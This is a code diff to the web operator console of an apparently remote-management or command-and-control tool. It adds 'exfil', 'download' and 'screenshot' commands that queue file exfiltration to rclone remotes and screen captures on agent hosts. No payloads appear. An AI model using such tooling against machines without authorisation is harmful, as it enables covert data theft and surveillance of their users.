@@ -9,6 +9,9 @@ const SHELL_HISTORY_MAX = 100;
 /** Agent dispatch prefixes (client_rmm.ps1 Invoke-RmmUserCommand). */
 const SHELL_DISPATCH_PREFIXES = ["cmd:", "PS:", "powershell:", "pwsh:"];
 
+/** Operator meta commands (rmm_cli.py) — routed to REST, not the agent shell. */
+const SHELL_META_COMMANDS = ["exfil", "download", "screenshot"];
+
 const state = {
   token: sessionStorage.getItem(STORAGE_KEY) || "",
   sessions: [],
@@ -35,6 +38,8 @@ const state = {
   shellHistoryNav: { index: -1, draft: "" },
   /** Tab cycle state for multi-match completion. */
   shellTabCycle: { anchor: null, candidates: [], index: -1 },
+  /** Default rclone profile from GET /api/v1/rclone/config. */
+  rcloneDefaultProfile: "",
 };
 
 const $ = (sel) => document.querySelector(sel);
@@ -1328,6 +1333,9 @@ function getShellCompletionCandidates(line) {
   for (const p of SHELL_DISPATCH_PREFIXES) {
     add(p);
   }
+  for (const cmd of SHELL_META_COMMANDS) {
+    add(cmd);
+  }
 
   cands.sort((a, b) => {
     const aHist = history.includes(a);
@@ -1819,10 +1827,198 @@ function clearShellInput() {
   input.focus();
 }
 
+function parseShellWords(line) {
+  const words = [];
+  let cur = "";
+  let quote = null;
+  for (let i = 0; i < line.length; i += 1) {
+    const c = line[i];
+    if (quote) {
+      if (c === quote) {
+        quote = null;
+      } else if (c === "\\" && quote === '"' && i + 1 < line.length) {
+        cur += line[++i];
+      } else {
+        cur += c;
+      }
+      continue;
+    }
+    if (c === '"' || c === "'") {
+      quote = c;
+      continue;
+    }
+    if (/\s/.test(c)) {
+      if (cur) {
+        words.push(cur);
+        cur = "";
+      }
+      continue;
+    }
+    cur += c;
+  }
+  if (cur) words.push(cur);
+  return words;
+}
+
+function defaultExfilProfile() {
+  const select = $("#exfil-profile");
+  if (select && !select.disabled && select.value.trim()) {
+    return select.value.trim();
+  }
+  return state.rcloneDefaultProfile || "";
+}
+
+function parseExfilShellArgs(rest) {
+  if (!rest.length) {
+    return { error: "Usage: exfil <remote_path> [profile]" };
+  }
+  let remote = rest[0];
+  let profile = "";
+  const profileFlag = rest.indexOf("--profile");
+  if (profileFlag >= 0) {
+    if (profileFlag === 0 || profileFlag >= rest.length - 1) {
+      return { error: "Usage: exfil <remote_path> [profile]" };
+    }
+    remote = rest.slice(0, profileFlag).join(" ");
+    profile = rest[profileFlag + 1];
+  } else if (rest.length === 2) {
+    profile = rest[1];
+  } else if (rest.length > 2) {
+    return { error: "Usage: exfil <remote_path> [profile]" };
+  }
+  if (!profile) {
+    profile = defaultExfilProfile();
+  }
+  if (!profile) {
+    return {
+      error:
+        "No rclone profile — pick one in the Exfil panel or pass a profile name",
+    };
+  }
+  return { remote, profile };
+}
+
+async function postDownloadQueue(remote) {
+  const { status, data } = await api(
+    `/sessions/${encodeURIComponent(state.selectedId)}/download`,
+    {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ remote_path: remote }),
+    }
+  );
+  if (status !== 200) {
+    appendShellError(data.error || `HTTP ${status}`);
+    return false;
+  }
+  pollSessionEvents().catch(() => {});
+  return true;
+}
+
+async function postExfilQueue(remote, profile) {
+  const { status, data } = await api(
+    `/sessions/${encodeURIComponent(state.selectedId)}/exfil`,
+    {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ remote_path: remote, profile }),
+    }
+  );
+  if (status !== 200) {
+    appendShellError(data.error || `HTTP ${status}`);
+    return false;
+  }
+  pollSessionEvents().catch(() => {});
+  return true;
+}
+
+async function postScreenshotQueue() {
+  const { status, data } = await api(
+    `/sessions/${encodeURIComponent(state.selectedId)}/screenshot`,
+    { method: "POST", headers: { "Content-Type": "application/json" }, body: "{}" }
+  );
+  if (status !== 200) {
+    appendShellError(data.error || `HTTP ${status}`);
+    return false;
+  }
+  pollSessionEvents().catch(() => {});
+  return true;
+}
+
+/** @returns {boolean} true if cmd was a meta command (handled locally). */
+async function dispatchShellMetaCommand(cmd) {
+  const words = parseShellWords(cmd);
+  if (!words.length) return false;
+  const verb = words[0].toLowerCase();
+  const rest = words.slice(1);
+
+  if (verb === "download") {
+    if (!rest.length) {
+      appendShellError("Usage: download <remote_path>");
+      return true;
+    }
+    const remote = rest.join(" ");
+    appendShellEcho(`download ${remote}`, {
+      block: true,
+      kind: "download",
+      remotePath: remote,
+      meta: "(download queued)",
+      matchKeys: [`download ${remote}`, `__DOWNLOAD__ ${remote}`],
+    });
+    await postDownloadQueue(remote);
+    return true;
+  }
+
+  if (verb === "exfil") {
+    const parsed = parseExfilShellArgs(rest);
+    if (parsed.error) {
+      appendShellError(parsed.error);
+      return true;
+    }
+    const { remote, profile } = parsed;
+    appendShellEcho(`exfil ${remote} ${profile}`, {
+      block: true,
+      kind: "exfil",
+      remotePath: remote,
+      meta: `(exfil queued via ${profile})`,
+      matchKeys: [
+        `exfil ${remote} ${profile}`,
+        `exfil ${remote}`,
+        `exfil ${remote} --profile ${profile}`,
+      ],
+    });
+    await postExfilQueue(remote, profile);
+    return true;
+  }
+
+  if (verb === "screenshot") {
+    if (rest.length) {
+      appendShellError("Usage: screenshot");
+      return true;
+    }
+    appendShellEcho("screenshot", {
+      block: true,
+      kind: "screenshot",
+      meta: "(screenshot queued)",
+      matchKeys: ["screenshot", "__SCREENSHOT__"],
+    });
+    await postScreenshotQueue();
+    return true;
+  }
+
+  return false;
+}
+
 async function runCommand(wait) {
   const input = $("#shell-input");
   const cmd = input.value.trim();
   if (!cmd || !state.selectedId) return;
+
+  if (await dispatchShellMetaCommand(cmd)) {
+    clearShellInput();
+    input.focus();
+    return;
+  }
 
   clearShellInput();
   appendShellEcho(cmd, {
@@ -1883,17 +2079,7 @@ async function queueDownload() {
     matchKeys: [`download ${remote}`, `__DOWNLOAD__ ${remote}`],
   });
   $("#download-remote").value = "";
-  const { status, data } = await api(
-    `/sessions/${encodeURIComponent(state.selectedId)}/download`,
-    {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ remote_path: remote }),
-    }
-  );
-  if (status !== 200) {
-    appendShellError(data.error || `HTTP ${status}`);
-  }
+  await postDownloadQueue(remote);
 }
 
 function formatExfilProfileOption(profile) {
@@ -1911,6 +2097,7 @@ function populateExfilProfiles(data) {
   select.replaceChildren();
   const profiles = data?.profiles || [];
   const defaultName = data?.default_profile || "";
+  state.rcloneDefaultProfile = defaultName;
   const ready = Boolean(data?.rclone_binary) && profiles.length > 0 && !data?.load_error;
 
   if (!data?.rclone_binary) {
@@ -2001,17 +2188,7 @@ async function queueExfil() {
     matchKeys: [`exfil ${remote} ${profile}`, `exfil ${remote}`, `exfil ${remote} --profile ${profile}`],
   });
   $("#exfil-remote").value = "";
-  const { status, data } = await api(
-    `/sessions/${encodeURIComponent(state.selectedId)}/exfil`,
-    {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ remote_path: remote, profile }),
-    }
-  );
-  if (status !== 200) {
-    appendShellError(data.error || `HTTP ${status}`);
-  }
+  await postExfilQueue(remote, profile);
 }
 
 async function queueScreenshot() {
@@ -2022,13 +2199,7 @@ async function queueScreenshot() {
     meta: "(screenshot queued)",
     matchKeys: ["screenshot", "__SCREENSHOT__"],
   });
-  const { status, data } = await api(
-    `/sessions/${encodeURIComponent(state.selectedId)}/screenshot`,
-    { method: "POST", headers: { "Content-Type": "application/json" }, body: "{}" }
-  );
-  if (status !== 200) {
-    appendShellError(data.error || `HTTP ${status}`);
-  }
+  await postScreenshotQueue();
 }
 
 async function queueUpload() {
